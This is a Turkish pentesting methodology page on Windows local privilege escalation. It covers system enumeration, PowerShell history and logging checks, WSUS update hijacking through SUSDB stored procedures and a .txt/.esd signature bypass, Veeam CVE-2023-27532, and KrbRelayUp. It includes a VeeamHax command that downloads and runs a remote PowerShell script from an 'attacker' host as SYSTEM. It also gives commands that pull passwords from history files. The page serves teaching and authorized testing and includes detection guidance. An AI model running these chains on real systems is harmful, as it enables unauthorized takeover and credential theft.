# Windows Yerel Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows yerel yetki yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Bu sayfada, temel nitelikteki birkaç kılavuzda yer alan genel Windows yetki yükseltme metodolojisi bir araya getirilmiştir.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Uygulamaya yönelik numaralandırma akışında topluluk atölyelerinden ve kontrol listelerinden de yararlanılmıştır.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Geçmişteki saldırı materyalleri arasında Windows yetki yükseltme konulu DerbyCon sunumu da bulunur.<sup>[[5]](#references)</sup>

## Başlangıç için Windows Teorisi

### **Access Tokens**

**Windows access token'larının ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL'ler - DACL'ler/SACL'ler/ACE'ler

**ACL'ler - DACL'ler/SACL'ler/ACE'ler hakkında daha fazla bilgi için aşağıdaki sayfaya bakın:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Bütünlük Düzeyleri

**Windows'ta bütünlük düzeylerinin ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Denetimleri

Windows'ta **sistemi numaralandırmanızı**, çalıştırılabilir dosyaları başlatmanızı **engelleyebilecek** veya faaliyetlerinizi **tespit edebilecek** çeşitli unsurlar vardır. Yetki yükseltme numaralandırmasına başlamadan önce aşağıdaki **sayfayı okuyup** bu **savunma mekanizmalarının** tümünü **numaralandırmalısınız**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fiziksel erişim, çevrimdışı bir UEFI NVRAM düzenlemesini önyükleme öncesi DMA'ya ve Windows `SYSTEM` belleğine yama uygulama zincirine de dönüştürebilir:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess Sessiz Yetki Yükseltme

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess süreçleri, AppInfo'nun güvenli yol denetimleri atlatıldığında uyarı göstermeden High IL düzeyine ulaşmak için kötüye kullanılabilir. Özel UIAccess/Admin Protection atlatma iş akışına buradan bakın:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop erişilebilirlik kayıt defteri yayılımı, keyfi bir SYSTEM kayıt defteri yazma işlemi (RegPwn) için kötüye kullanılabilir:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Son Windows sürümlerinde, ayrıcalıklı bir yerel NTLM kimlik doğrulamasının yeniden kullanılan bir SMB TCP bağlantısı üzerinden yansıtıldığı **SMB arbitrary-port** LPE yolu da kullanıma sunulmuştur:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Sistem Bilgileri

Mevcut bir PowerShell oturumundan yerel envanter çıkarmak için bkz. [Windows Enumeration with .NET](../basic-powershell-for-pentesters/dotnet-enumeration.md). Bu örnekler, ayrı numaralandırma çalıştırılabilir dosyaları başlatmadan aşağıdaki denetimleri tamamlar.

### Sürüm bilgilerinin numaralandırılması

Windows sürümünde bilinen bir güvenlik açığı olup olmadığını kontrol edin (uygulanan yamaları da inceleyin).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Version Exploits

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunur ve Windows ortamlarının sunduğu **devasa saldırı yüzeyini** gösterir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas, watson'ı içerir)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — işletim sistemi derlemesini, yüklü güncelleştirmeleri ve seçili olası güvenlik duyurularını envanterler; bir sonucu geçerli kabul etmeden önce tam ürünü ve onun yerini alan güncelleştirmeleri doğrulayın.

Sürüme özgü bir yerel exploit için işletim sistemi mimarisinin yanı sıra **çalışan işlem mimarisini** de kontrol edin. 64 bit Windows'ta 32 bit bir işlem [WOW64 dosya sistemi yönlendirmesine](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) tabidir: `%windir%\System32` genellikle 32 bit sistem dizinine yönlenirken `%windir%\Sysnative`, işlemin yerel sistem dizinine erişmesini sağlar. Bu takma ad 64 bit bir işlemde kullanılamaz. Bir işletim sistemi derlemesi veya eksik KB adayı, sistemin exploit edilebilir olduğunu kanıtlamaz; çalışan derlemeyi, yüklü veya onun yerini alan güncelleştirmeyi, işlem mimarisini ve exploit önkoşullarını ilgili sorun için yayımlanan [Microsoft güvenlik bülteniyle](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) karşılaştırın.

Hizmet belleği bozulmasına dair bir örnek için [istemci denetimindeki MIDI paylaşımlı bellek halkası ofsetlerine](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions) bakın. Yayımlanan yığın ofsetleri yalnızca test edilen derleme için geçerlidir; `LOCAL SERVICE` yetkisine ulaşmak, daha sonra [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) ile `SYSTEM` yetkisine yükselmekten farklıdır.<sup>[[44]](#references)</sup>

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit'lerin Github depoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kayıtlı herhangi bir kimlik bilgisi/Juicy bilgi var mı?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell Geçmişi

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` yalnızca bir örnektir. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normalde her kullanıcının Documents klasörüne yazar; ancak `OutputDirectory` ayarı veya `Start-Transcript -OutputDirectory`, dosyaları paylaşılan ya da gizli bir klasöre yönlendirebilir. Bir transcript'i incelemeden önce etkin çıktı yolunu ve dosya ACL'sini kontrol edin: transcript, kimlik bilgileri de dahil olmak üzere komut bağımsız değişkenlerini ve çıktıları içerebilir. Okunabilir bir transcript, yalnızca içeriği kullanılabilir ve daha yüksek ayrıcalıklara sahip bir kimliği açığa çıkarıyorsa ve bu kimlik ilgili bağlamda oturum açabiliyorsa bir ipucu niteliğindedir.

### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; buna yürütülen komutlar, komut çağrıları ve betiklerin bazı bölümleri dahildir. Ancak yürütmenin tüm ayrıntıları ve çıktı sonuçları kaydedilmeyebilir.

Bunu etkinleştirmek için belgelerdeki "Transcript files" bölümündeki yönergeleri izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini tercih edin.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShell günlüklerindeki son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Komut dosyasının yürütülmesine ilişkin tüm etkinlikler ve içeriğin tamamı kaydedilir; böylece her kod bloğu çalışırken belgelenir. Bu süreç, her etkinliğin kapsamlı bir denetim izini korur ve adli incelemeler ile kötü amaçlı davranışların analizinde değer sağlar. Yürütme sırasında tüm etkinlikler belgelenerek süreç hakkında ayrıntılı bilgiler sunulur.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block için günlük olayları Windows Event Viewer'da şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### İnternet Ayarları

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Sürücüler

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Önceki yönlendirmede risk şu şekilde özetlenmişti:

Güncellemeler http**S** yerine http üzerinden isteniyorsa sistemi ele geçirebilirsiniz.

HTTP WSUS uç noktası, güncelleme meta verilerinin ele geçirilmesi ihtimalini araştırmak için bir ipucudur. İstismarın mümkün olması ayrıca istemcinin bu WSUS sunucusunu kullanmasına, saldırganın trafiği kesebilmesine veya kontrol edebilmesine ve istemcinin güncelleme güveni ile yükleme politikasına bağlıdır. URL tek başına kod yürütüldüğünü kanıtlamaz. [Microsoft, WSUS meta verileri için TLS kullanılmasını öneriyor](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Ağda SSL kullanmayan bir WSUS güncellemesi olup olmadığını, cmd'de aşağıdaki komutu çalıştırarak kontrol etmeye başlayabilirsiniz:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ya da PowerShell'de aşağıdakini kullanın:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Şunlardan biri gibi bir yanıt alırsanız:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` sonucu `1` ise.

Özgün uygulanabilirlik açıklaması şöyleydi:

O hâlde, **bu açık istismar edilebilir.** Son kayıt defteri değeri `0` ise WSUS girdisi yok sayılır.

`UseWUServer` değeri `1` olduğunda Windows Update, yapılandırılmış intranet hizmetini kullanır. Bu, HTTP trafiğini araya girerek yakalama yolu için bir ön koşulu doğrular; ancak trafiğin yakalanabileceğini, kötü amaçlı güncellemelerin kabul edileceğini veya yükseltilmiş ayrıcalıklarla yükleme yapılabileceğini kanıtlamaz. Değer `0` olduğunda, bu ilkeyle yapılandırılmış WSUS uç noktası seçilmez.

Bu açıkları istismar etmek için [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) gibi araçları kullanabilirsiniz. Bunlar, SSL olmayan WSUS trafiğine "sahte" güncellemeler enjekte etmek için hazırlanmış MiTM exploit betikleridir.

Araştırmayı burada okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Raporun tamamını buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Temel olarak, bu hata şu açıktan yararlanır:

> Yerel kullanıcı proxy ayarlarımızı değiştirebiliyorsak ve Windows Updates, Internet Explorer ayarlarında yapılandırılan proxy'yi kullanıyorsa, [PyWSUS](https://github.com/GoSecure/pywsus) uygulamasını yerel olarak çalıştırarak kendi trafiğimizi araya girip yakalayabilir ve varlığımızda yükseltilmiş bir kullanıcı olarak kod çalıştırabiliriz.
>
> Ayrıca WSUS hizmeti geçerli kullanıcının ayarlarını kullandığından, kullanıcının sertifika deposunu da kullanır. WSUS ana bilgisayar adı için kendinden imzalı bir sertifika oluşturup bu sertifikayı geçerli kullanıcının sertifika deposuna eklersek hem HTTP hem de HTTPS WSUS trafiğini araya girip yakalayabiliriz. WSUS, sertifika üzerinde ilk kullanımda güven türü bir doğrulama uygulamak için HSTS benzeri mekanizmalar kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir bulunuyorsa ve doğru ana bilgisayar adına sahipse hizmet tarafından kabul edilir.

Bu açığı [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla istismar edebilirsiniz (araç kullanıma açıldığında).

### WSUS yöneticisinin denetimindeki güncellemeler

Geçerli kimliğin WSUS sunucusunda güncellemeleri **yayımlayıp onaylayabildiği** durumlarda ayrı bir yol vardır. Sunucunun `WSUS Administrators` grubundaki etkin üyeliği ve devredilmiş WSUS izinlerini kontrol edin, ardından onaylanan güncellemeyi alacak istemci bilgisayar grubunu belirleyin. [Microsoft, güncellemeleri onaylamak için WSUS Administrator ayrıcalıkları gerektiğini belirtir](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) ve [yayımlama güven ilişkisini belgeler](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): istemciler, yerel olarak yayımlanan içerik için kullanılan imzalama sertifikasına güvenmelidir. Bunu bir ayrıcalık yükseltme yolu olarak değerlendirmeden önce aday güncellemenin imzalı ve kabul edilmiş olduğunu, hedef için geçerli olduğunu ve daha ayrıcalıklı bir bağlamda yüklendiğini doğrulayın. Tek başına bir HTTP `WUServer` değeri veya grup adı bu koşulların sağlandığını göstermez.

### SUSDB özel güncelleme suistimali: `.txt`/`.esd` üzerinden imzasız payload'lar

Bu, HTTP WSUS bağlantısını araya girip yakalamaktan farklı bir güven sınırı ihlalidir: ön koşul, özel bir güncellemeyi yayımlamak ve onaylamak için **WSUS veritabanındaki (`SUSDB`) saklı yordamları** kullanabilecek kadar erişimdir. Uygulanabilir giriş yollarından biri, bir WSUS bilgisayar hesabını `SUSDB` barındıran ayrı bir MSSQL sunucusuna aktarmaktır. Kesin ön koşul dağıtıma bağlıdır; bu nedenle SQL yönetici haklarınız olduğunu varsaymak yerine önce `EXECUTE` izinlerini listeleyin.<sup>[[38]](#references)[[39]](#references)</sup>

WSUS istemci kimlik doğrulamasını HTTP/8530'dan LDAP, SMB veya AD CS'ye aktaran ayrı saldırı yolu için bkz. [NTLM relay için WSUS HTTP'yi suistimal etme](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Harici veritabanına aktarımı ve yordam izinlerini doğrulama

WSUS'un harici bir SQL Server kullandığı dağıtımlarda önce WSUS sunucu hesabının veritabanında kimlik doğrulaması yapıp yapamadığını ve NTLM relay'in bu dinleyiciye ulaşıp ulaşmadığını kontrol edin. Sunucunun SQL rolü, doğrudan tablo yazma işlemleri engellenmiş olsa bile güncelleme yayımlama yordamlarını kullanma izni verebilir; `SUSDB` üzerinde başarısız olan bir `UPDATE` işlemi, yayımlamanın engellendiğini göstermez. Özel bir güncelleme denemeden önce yetkili bir SQL oturumunda etkin kimliği, rol üyeliğini ve yordam izinlerini inceleyin.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Canlı prosedür tanımları ve yüklü `SoftwareDistributionPackage.xsd`, geçerli güncelleme meta verilerini yeniden oluştururken işe yarar. Hem bundle üst öğesi hem de payload alt öğesi `UpdateIdentity` (fragment türü `1`), `LocalizedProperties` (`4`) ve `ExtendedProperties` (`2`) gerektirir; her `spImportUpdate` çağrısının döndürdüğü yerel revizyon kimliğini kaydedin ve bundle ilişkisini, özet değerlerini, boyutu, içerik URL'sini ve revizyonu tutarlı tutun. Bu, duruma bağlı bir yayınlama iş akışıdır; bu nedenle başarılı olan tek bir stored-procedure çağrısı, istemci tarafında çalıştırıldığını kanıtlamaz.<sup>[[38]](#references)</sup>

#### Güncellemeyi oluşturma, hedefleme ve onaylama

Özel güncelleme iş akışı, kısıtlı bir yayınlama API'si olarak meşru WSUS prosedürlerini kullanır. Önemli durum geçişleri şunlardır:<sup>[[38]](#references)</sup>

| Aşama | İlgili stored procedure'ler |
| --- | --- |
| Güncelleme meta verilerini içe aktarma | `spImportUpdate` |
| Ön koşul, yerelleştirilmiş ve genişletilmiş XML parçalarını depolama | `spSaveXMLFragment` |
| İçerik özetini saldırganın kontrolündeki URL ile ilişkilendirme | `spSetBatchURL` |
| Bir bilgisayar grubu listeleme/oluşturma ve istemciyi gruba ekleme | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Bu grup için yüklemeyi onaylama | `@actionID = 0` ve `@isAssigned = 1` ile `spDeployUpdate` |

Dosya adı, özetler, boyut ve `CommandLineInstallation` işleyicisi, içe aktarılan meta veriler ve fragment'lar genelinde birbiriyle uyumlu olmalıdır. İçerik URL'sini ve hedef grubunu atadıktan sonra son onay aşağıdakine benzer; örnek GUID'leri yeniden kullanmak yerine yeni güncelleme, grup ve dağıtım tanımlayıcıları kullanın.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Uzantı güdümlü imza atlatma

WSUS normalde imzasız, keyfi yürütülebilir içeriği reddeder. Ancak `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` içindeki .NET `VerifyFile` yolu, sağlanan dosya adı `.txt` veya `.esd` ile bitiyorsa sertifika denetimi bayrağını false olarak ayarlar; böylece baytların metin veya geçerli bir ESD görüntüsü olduğu önceden doğrulanmadan `CheckCertificateSignature` atlanır. Dolayısıyla örneğin `payload.exe.txt` olarak adlandırılmış, değiştirilmemiş bir PE içerik doğrulamasından geçebilir ve daha sonra güncellemenin komut satırı yükleme işleyicisi tarafından başlatılabilir. Bu, imza sahteciliği değil, bir ilke/tür karışıklığı hatasıdır.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS uyumlu staging ve otomasyon

`spDeployUpdate` çağrıldığında WSUS, kayıtlı içeriği getirir. Kaynak, BITS'in HTTP beklentilerini karşılamalıdır: erişilebilir bir URL tek başına yeterli değildir; çünkü aktarım, ilk `HEAD`/`GET` akışını ve byte-range isteklerini kullanır. Range desteği olmayan bir sunucu, BITS'in Range protokol başlığını gerektirdiğini belirten WSUS eşitleme `EventId=364` hatasına neden olur.<sup>[[39]](#references)</sup>

Araştırma PoC'si [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious), import/fragment/URL/group/deployment zinciri için gerekli SQL'i oluşturur, bu zinciri yürütmek üzere değiştirilmiş bir MSSQL istemcisi içerir ve içerik staging'i için `BitsWebServer.py` dosyasını sunar. Yetkili bir laboratuvarda kullanılabilecek asgari komut şöyledir:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Gözetimsiz yürütme ve yeniden deneme yoluyla kalıcılık

İstemci tarafındaki etkileşim ilkelere bağlıdır. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` altında `4 - Auto download and schedule install` seçeneği, onaylanmış bir güncellemenin kullanıcı tarafından elle seçilmeden indirilip yapılandırılan zamanlamaya göre yüklenmesini sağlar. Test sırasında, güncellemesi başarısız/tamamlanmamış durumda kalan bir payload, callback süreci sona erdikten hemen sonra yeniden sunuldu. Bu nedenle yeniden deneme davranışı yinelenen yürütme yoluyla kalıcılık sağlayabilir; ancak istemci güncelleme başarısız durumunu gösterdiği için dikkat çeker.<sup>[[39]](#references)</sup>

#### Tespit ve güçlendirme için inceleme noktaları

Bu zincir kapsamında sunucu ve istemci tarafında yararlı inceleme noktaları şunlardır:<sup>[[39]](#references)</sup>

- `SUSDB` üzerinde `spCreateTargetGroup`, `spSetBatchURL` ve `spDeployUpdate` çalıştırılmasını denetleyin; yeni hedefleme gruplarını, harici içerik kaynaklarını, `.txt`/`.esd` güncelleme payload'larını ve beklenmeyen kullanıcılar (özellikle bilgisayar hesabı olmayanlar) tarafından yapılan dağıtımları araştırın.
- `C:\Program Files\Update Services\LogFiles` konumunda `ContentSyncAgent`, `FileVerified`, yazım hatalı `FileVerficationFailed` ve `EventId=364` kayıtlarını inceleyin; doğrulamayı, uzantıya güvenmek yerine payload uzantısı ve içerik imzasıyla ilişkilendirin.
- Windows Update'in tekrar tekrar başarısız olup yeniden denenmesini ve `.txt` veya `.esd` adları taşıyan içeriklerden kaynaklanan PE yürütmesini ya da beklenmeyen alt süreç/ağ etkinliklerini araştırın.
- Desteklendiği yerlerde veritabanı hizmetinde Authentication için Extended Protection'ı zorunlu kılın ve veritabanına ağ erişimini WSUS sunucusu ile yetkili yönetim sistemleriyle sınırlandırın. Özel güncelleme prosedürlerindeki `EXECUTE` izinlerini en aza indirin ve denetleyin.

## Üçüncü Taraf Otomatik Güncelleyiciler ve Agent IPC (yerel privesc)

Birçok kurumsal agent, localhost üzerinden erişilebilen bir IPC yüzeyi ve ayrıcalıklı bir güncelleme kanalı sunar. Kayıt işlemi saldırganın sunucusuna yönlendirilebiliyor ve güncelleyici sahte bir root CA'ya veya zayıf signer denetimlerine güveniyorsa, yerel bir kullanıcı SYSTEM hizmetinin yükleyeceği kötü amaçlı bir MSI gönderebilir. Genelleştirilmiş bir tekniği (Netskope stAgentSvc zincirini temel alır – CVE-2025-0309) burada görebilirsiniz:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 üzerinden SYSTEM)

Sürüme özgü özgün açıklama ve keşif notu şöyleydi:

Veeam B&R < `11.0.1.1261`, saldırgan tarafından denetlenen mesajları işleyen ve **NT AUTHORITY\SYSTEM** olarak rastgele komutlar çalıştırılmasına olanak tanıyan, localhost üzerinde **TCP/9401** kullanan bir hizmet sunar.<sup>[[12]](#references)</sup>

- **Recon**: dinleyiciyi ve sürümü doğrulayın; örneğin `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` komutlarını kullanın.

Veeam Backup & Replication ve Cloud Connect, varsayılan olarak **TCP/9401** üzerinde çalışan bir temel yedekleme hizmeti kullanır. [Veeam'in duyurusu](https://www.veeam.com/kb4424), yedekleme ağı sınırları içinde şifrelenmiş yapılandırma veritabanı kimlik bilgilerinin kimlik doğrulaması olmadan ifşa edilmesini açıklar; ayrı bir herkese açık PoC ise **NT AUTHORITY\SYSTEM** olarak komut yürütme yolunu gösterir.<sup>[[12]](#references)</sup> Hizmet localhost dışındaki adreslere de bağlanabilir; bu nedenle gerçek adresini ve PID'sini kontrol edin.

- **Recon**: TCP/9401'in `Veeam.Backup.Service.exe` işlemine ait olduğunu doğrulayın, ardından yüklü ürünü ve yama metaverilerini inceleyin. `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ipucu sağlar, ancak yama durumunu eksiksiz doğrulamaz.
- **Düzeltilmiş sürümler**: Veeam, **11a build 11.0.1.1261 P20230227** ve **12 build 12.0.0.1420 P20230223** sürümlerini ilk düzeltilmiş sürümler olarak listeler; daha eski sürümler etkilenir. Dört parçalı bir dosya sürümü tek başına, aynı build numaralarındaki yamalanmamış temel sürüm ile sonraki bir yamayı birbirinden ayıramaz. Sınır sürümünün düzeltilmiş olduğunu belirtmeden önce yama tanımlayıcısını [üreticinin build geçmişiyle](https://www.veeam.com/kb2680) doğrulayın.
- **Exploit**: `VeeamHax.exe` gibi bir PoC'yi gerekli Veeam DLL'leriyle birlikte aynı dizine yerleştirin, ardından yerel socket üzerinden bir SYSTEM payload tetikleyin:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Hizmet, komutu SYSTEM olarak yürütür.

Atıfta bulunulan PoC, ek ön koşullar sağlandığında SYSTEM olarak komut yürütüldüğünü gösterir; üreticinin güvenlik duyurusu ise kimlik bilgilerinin açığa çıkması sorununu açıklar.

## KrbRelayUp

Varsayılan ortamla ilgili özgün açıklama şöyleydi:

Belirli koşullar altında Windows **domain** ortamlarında bir **local privilege escalation** güvenlik açığı bulunur. Bu koşullar arasında **LDAP signing uygulanmayan,** kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmalarına olanak tanıyan self-rights izinlerine sahip olduğu ve kullanıcıların domain içinde bilgisayar oluşturabildiği ortamlar yer alır. Bu **gereksinimlerin** **default settings** kullanılarak karşılandığını belirtmek önemlidir.

Yerel bir Kerberos relay, uygun bir COM server kimlik doğrulaması yaptığında ve relay edilen principal hedef nesne üzerinde gerekli haklara sahip olduğunda, düşük ayrıcalıklı bir oturum açma bağlamından ayrıcalıklı bir dizin yazma işlemine geçebilir. [KrbRelay belgeleri](https://github.com/cube0x0/KrbRelay) hem RBCD hem de `msDS-KeyCredentialLink` (shadow-credential) LDAP yazma işlemlerini kapsar; KrbRelayUp bu yolların bazılarını otomatikleştirir. Bir RBCD zinciri, ilgili delegation ve hedef nesne haklarını gerektirirken shadow-credential zinciri, key-credential yazma haklarını ve sertifika kimlik doğrulama yolunu destekleyen bir KDC'yi gerektirir. Bu yollardan hiçbiri yalnızca domain üyeliğinden kaynaklanmaz.

